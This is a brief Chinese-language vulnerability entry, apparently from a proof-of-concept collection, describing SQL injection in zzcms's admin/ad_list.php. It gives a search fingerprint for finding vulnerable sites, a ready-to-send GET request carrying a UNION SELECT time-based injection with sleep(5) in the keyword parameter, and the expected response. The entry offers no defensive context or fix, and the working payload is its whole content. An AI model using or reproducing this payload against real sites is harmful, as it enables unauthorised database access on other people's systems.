# zzcms系统接口ad_list.php存在SQL注入漏洞

zzcms ｜ SQL注入 ｜ —
- **指纹**：`title="zzcms专业做招商网的程序源码"`
- **请求**：`GET /admin/ad_list.php?action=pass&&keyword='+union+SELECT+1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,sleep(5)+--+x HTTP/1.1`
- **响应特征**：200